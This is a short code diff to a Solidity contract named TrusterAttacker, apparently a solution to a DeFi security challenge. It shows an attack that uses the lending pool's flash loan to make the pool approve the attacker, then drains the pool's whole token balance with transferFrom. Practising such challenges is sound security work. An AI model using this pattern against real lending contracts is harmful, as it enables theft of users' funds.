@@ -25,7 +25,7 @@ contract TrusterAttacker {
     }
 
     function attack() external {
-        //Approve unlimited spending of pool through flash loan
+        //Approve unlimited spending of pool through flash loan to this contract address
         bytes memory data = abi.encodeWithSignature(
             ("approve(address,uint256)"),
             address(this),
@@ -39,10 +39,6 @@ contract TrusterAttacker {
             data
         );
         uint256 balance = damnValubeleToken.balanceOf(address(lendingPool));
-        damnValubeleToken.transferFrom(
-            address(lendingPool),
-            admin,
-            balance
-        );
+        damnValubeleToken.transferFrom(address(lendingPool), admin, balance);
     }
 }
